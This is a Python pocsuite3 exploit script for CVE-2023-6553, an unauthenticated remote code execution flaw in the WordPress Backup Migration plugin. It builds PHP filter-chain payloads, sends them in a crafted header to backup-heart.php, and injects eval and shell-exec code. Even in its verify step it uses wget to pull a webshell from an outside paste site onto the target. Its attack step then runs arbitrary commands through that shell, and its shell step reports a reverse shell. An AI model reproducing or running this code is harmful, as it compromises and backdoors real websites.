import re
import random
import string
import base64
from urllib.parse import urljoin
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, OptDict, OptString, OrderedDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
from pocsuite3.lib.core.exception import PocsuiteValidationException
from requests.exceptions import RequestException, Timeout, HTTPError
import warnings

class PHPFilterChainGenerator:
    def __init__(self):
        self.conversions = {
            "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
            "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
            "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
            "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
            "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
            "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
            "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
            "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
            "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
            "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
            "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
            "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
            "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
            "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
            "C": "convert.iconv.UTF8.CSISO2022KR",
            "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
            "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
            "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
            "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
            "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
            "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
            "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
            "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
            "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
            "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
            "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
            "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
            "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
            "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
            "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
            "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
            "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
            "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
            "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
            "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
            "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
            "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
            "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
            "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
            "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
            "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
            "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
            "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
            "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
            "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
            "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
            "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
            "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
            "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
            "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
            "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
            "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
            "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
            "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
            "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
            "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
            "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
            "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
            "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
            "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
            "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
            "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
            "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
            "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
            "=": "",
        }

    def generate_filter_chain(self, chain):
        chain = chain.encode("utf-8")
        chain = base64.b64encode(chain).decode("utf-8").replace("=", "")
        encoded_chain = chain
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"

        for c in encoded_chain[::-1]:
            filters += self.conversions[c] + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"

        filters += "convert.base64-decode"
        final_payload = f"php://filter/{filters}/resource=php://temp"
        return final_payload


class CVE_2023_6553_POC(POCBase):
    vulID = 'CVE-2023-6553'
    version = '1'
    author = ['Pocsuite3']
    vulDate = '2023-12-11'
    createDate = '2025-07-01'
    updateDate = '2025-07-02'
    references = 'https://www.cve.org/CVERecord?id=CVE-2023-6553'
    name = 'WordPress Backup Migration Plugin <= 1.3.7 Unauthenticated RCE CVE-2023-6553'
    appPowerLink = 'https://wordpress.org/plugins/backup-backup/'
    appName = 'WordPress Backup Migration Plugin'
    appVersion = '<= 1.3.7'
    vulType = 'Remote Code Execution'
    desc = '''
        The Backup Migration plugin for WordPress (version <= 1.3.7) is vulnerable to 
        unauthenticated remote code execution (CVE-2023-6553) due to improper input validation 
        in the backup-heart.php file, allowing attackers to execute arbitrary PHP code via 
        crafted HTTP headers using a PHP filter chain technique.
    '''
    samples = []
    install_requires = []

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('whoami', description='Command execution', require=True)
        return o

    def _check_wordpress(self, url):
        """Check if the target is a WordPress installation."""
        url = url.rstrip("/") + "/"
        wp_endpoints = ["wp-login.php", "wp-admin/", "xmlrpc.php"]
        for endpoint in wp_endpoints:
            wp_url = urljoin(url, endpoint)
            try:
                response = requests.get(wp_url, verify=False, timeout=10)
                if response.status_code in [200, 301, 302] and any(keyword in response.text.lower() for keyword in ["wp-login", "wordpress", "xmlrpc"]):
                    logger.info(f"WordPress detected at {wp_url}")
                    return True
            except RequestException as e:
                logger.debug(f"Failed to check WordPress at {wp_url}: {str(e)}")
        logger.error("WordPress installation not detected")
        return False

    def _check_plugin(self, url):
        """Check if the Backup Migration plugin is installed and vulnerable."""
        url = url.rstrip("/") + "/"
        readme_url = urljoin(url, "wp-content/plugins/backup-backup/readme.txt")
        try:
            response = requests.get(readme_url, verify=False, timeout=10)
            if response.status_code == 200 and "Backup Migration" in response.text:
                version_match = re.search(r"Stable tag: (\d+\.\d+\.\d+)", response.text)
                if version_match:
                    version = version_match.group(1)
                    logger.info(f"Detected Backup Migration plugin version: {version}")
                    if version <= "1.3.7":
                        return True
                else:
                    logger.debug("Could not determine plugin version, assuming vulnerable")
                    return True
        except RequestException as e:
            logger.debug(f"Failed to check plugin at {readme_url}: {str(e)}")
        return False

    def _generate_php_filter_payload(self, php_code):
        """Generates a PHP filter chain payload for the given PHP code."""
        generator = PHPFilterChainGenerator()
        return generator.generate_filter_chain(php_code)

    def _send_payload(self, url, php_filter_payload, post_data=None):
        headers = {"Content-Dir": php_filter_payload}
        try:
            response = requests.post(url, headers=headers, data=post_data, verify=False, timeout=20)
            return response
        except RequestException as e:
            return None

    def _verify(self):
        result = {}
        path = "wp-content/plugins/backup-backup/includes/backup-heart.php"
        url = urljoin(self.url.rstrip("/") + "/", path)
        random_var = ''.join(random.choices(string.ascii_letters, k=8))
        test_command = "phpinfo();" 
        php_code = f"<?php eval($_POST['{random_var}']);?>"
        b64_payload = base64.b64encode(test_command.encode()).decode()

        response = self._send_payload(url, self._generate_php_filter_payload(php_code), {random_var: b64_payload})
        if response and response.status_code == 200 and "phpinfo" in response.text.lower():
            result['VerifyInfo'] = {
                'URL': url,
                'Payload': self._generate_php_filter_payload(php_code),
                'PostData': {random_var: test_command}
            }
        random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=3)) + "@x7root.php"
        backdoor_url = "https://textbin.net/raw/y8lrlczqjr" 
        shell_payload = f"<?=`$_POST[ova]`?>"
        php_code = self._generate_php_filter_payload(shell_payload)
        exploit_data = {"ova": f"wget {backdoor_url} -O {random_file_name}"}
        response = self._send_payload(url, php_code, exploit_data)
        if response and response.status_code == 200:
            shell_url = urljoin(self.url.rstrip("/") + "/", f"wp-content/plugins/backup-backup/includes/{random_file_name}")
            check_response = requests.get(shell_url, verify=False, timeout=10)
            if check_response.status_code == 200 and "x7root-Tools" in check_response.text:
                result['VerifyInfo'] = {
                    'URL': shell_url,
                    'Payload': shell_payload,
                    'Status': 'Target is vulnerable'
                }

        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "wp-content/plugins/backup-backup/includes/backup-heart.php"
        url = urljoin(self.url.rstrip("/") + "/", path)
        cmd = self.get_option('cmd') 
        random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=3)) + "@x7root.php"
        backdoor_url = "https://textbin.net/raw/y8lrlczqjr"
        shell_payload = f"<?=`$_POST[ova]`?>"
        php_code = self._generate_php_filter_payload(shell_payload)
        exploit_data = {"ova": f"wget {backdoor_url} -O {random_file_name}"}
        
        response = self._send_payload(url, php_code, exploit_data)
        if response and response.status_code == 200:
            shell_url = urljoin(self.url.rstrip("/") + "/", f"wp-content/plugins/backup-backup/includes/{random_file_name}")
            check_response = requests.get(shell_url, verify=False, timeout=10)
            if check_response.status_code == 200 and "x7root-Tools" in check_response.text:
                cmd_response = requests.post(shell_url, data={"cmd": cmd}, verify=False, timeout=10)
                if cmd_response and cmd_response.status_code == 200:
                    output = cmd_response.text.strip()
                    output_match = re.search(r'<b>Output: (.*?)</b>', output, re.DOTALL)
                    if output_match:
                        output = output_match.group(1).strip()
                    else:
                        output = output if output else "No output received from command execution."
                    result['VerifyInfo'] = {
                        'URL': shell_url,
                        'Payload': shell_payload,
                        'Command': cmd,
                        'CommandOutput': output
                    }

        return self.parse_output(result)
        
    def _shell(self):
        result = {}
        path = "wp-content/plugins/backup-backup/includes/backup-heart.php"
        url = urljoin(self.url.rstrip("/") + "/", path)
        
        lhost = get_listener_ip()
        lport = get_listener_port() 
        
        random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=3)) + "@x7root.php"
        
        backdoor_url = "https://textbin.net/raw/r5oh77ibwm"
        shell_payload = f"<?=`$_POST[ova]`?>"
        php_code = self._generate_php_filter_payload(shell_payload)
        exploit_data = {"ova": f"wget {backdoor_url} -O {random_file_name}"}
        
        response = self._send_payload(url, php_code, exploit_data)
        if response and response.status_code == 200:
            shell_url = urljoin(self.url.rstrip("/") + "/", f"wp-content/plugins/backup-backup/includes/{random_file_name}")
            try:
                requests.get(shell_url, verify=False, timeout=10, allow_redirects=False)
                result['VerifyInfo'] = {
                    'URL': shell_url,
                    'Payload': shell_payload,
                    'ListenerHost': lhost,
                    'ListenerPort': lport,
                    'Status': 'Reverse shell active. Check your listener on {0}:{1}'.format(lhost, lport)
                }
            except RequestException as e:
                print(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            self._verify_info = result
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(CVE_2023_6553_POC)
